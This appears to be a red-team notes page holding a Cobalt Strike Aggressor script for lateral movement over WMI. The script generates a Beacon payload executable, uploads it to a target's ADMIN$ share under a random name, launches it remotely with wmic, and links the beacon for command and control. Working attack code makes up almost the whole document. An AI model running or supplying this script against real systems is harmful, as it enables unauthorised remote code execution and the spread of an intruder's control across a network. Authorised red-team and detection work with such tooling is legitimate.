# Jump

Search Tag(s): #helpers #command-and-control #post-exploitation #lateral-movement #cobalt-strike

TODO: Create aggressor scripts to aid in lateral movement

## WMI

`$ cat wmi-jump.cna`

---

TODO: Add powershell cmdlet Invoke-WmiMethod in the aggressor script wmi_psh and wmi64_psh

```perl
# $1 = bid (beacon_id), $2 = target, $3 = listener

$process_name = rand(@("svchost", "evil", "detectme"));

sub wmi_remote_spawn {
   local('$name $exedata');

   btask($1, "Tasked Beacon to jump to $2 (" . listener_describe($3) . ") via WMI", "T1047");

   # we need a random file name.
   $name = $process_name . rand(100) . ".exe";

   # generate an EXE. $arch defined via &lambda when this function was registered with
   # beacon_remote_exploit_register
   $exedata = artifact_payload($3, "exe", $arch);

   # upload the EXE to our target (directly)
   bupload_raw!($1, "\\\\ $+ $2 $+ \\ADMIN\$\\ $+ $name", $exedata);

   # execute this via WMI
   brun!($1, "wmic /node:\" $+ $2 $+ \" process call create \"\\\\ $+ $2 $+ \\ADMIN\$\\ $+ $name $+ \"");

   # assume control of our payload (if it's an SMB or TCP Beacon)
   beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("wmi", "x86", "Use WMI to run a Beacon payload", lambda(&wmi_remote_spawn, $arch => "x86"));
beacon_remote_exploit_register("wmi64", "x64", "Use WMI to run a Beacon payload", lambda(&wmi_remote_spawn, $arch => "x64"));
```

---
## References

- [Aggressor Script: Beacon](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as_beacon.htm)